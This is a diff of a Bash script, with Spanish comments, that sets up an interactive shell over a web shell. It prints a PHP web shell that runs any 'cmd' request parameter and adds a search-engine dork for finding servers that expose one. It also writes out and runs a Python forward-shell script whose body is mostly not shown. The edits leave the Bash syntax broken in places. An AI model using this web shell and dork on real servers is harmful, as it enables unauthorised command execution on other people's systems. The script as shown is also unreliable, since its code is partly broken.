@@ -1,29 +1,28 @@
 #!/bin/bash
-: ' 
+: '
 	crear una plataforma de despliegue de shell (tty) sobre una web.
 '
 CAJA=$(mktemp)
 
-# colors
+# color
 green=32; red=31; blue=34; yellow=33; purple=35; cian=36; gray=37
-function color()
-{
+function color {
 	colorcode="$1"
 	echo -e "\e[3;${colorcode};40m ${@:2} \e[m"
 }
+
 # exit
 trap ctrl_c INT
-function ctrl_c()
-{
-	rm webshell.py
+function ctrl_c{
+	rm $CAJA
 	color "$red" 'Saliendo... [!]'
 }
 
-# requiere esta estructura en el servidor 
-function vulnerable()
-{
+# requiere esta estructura en el servidor, se puede encontrar algunos con querys dorks 
+# inurl:php allintext:shell_exec
+function vulnerable {
 cat << 'VULN'
-Require: 
+Require:
 <?php
 	echo shell_exec($_REQUEST['cmd']);
 ?>
@@ -31,8 +30,7 @@ VULN
 }
 
 # python3 script from 'author: s4vitar'
-function pythonscript()
-{
+function pythonscript {
 cat << 'SCRIPT'
 import requests, time, threading, pdb, signal, sys
 from base64 import b64encode
@@ -101,7 +99,10 @@ while True:
 	time.sleep(1.1)
 SCRIPT
 }
+
 ( color "$cian" iniciando webshell!! )
 
-# sed 's/127.0.0.1/index.php/'$URI'/g'
+if ping "$1" -c 1; then
+# URI="$1" ; pythonscript | sed 's/127.0.0.1/index.php/'$URI'/g' > CAJA
+fi
 (pythonscript > $CAJA; python3 $CAJA || color "$red" $(vulnerable) )
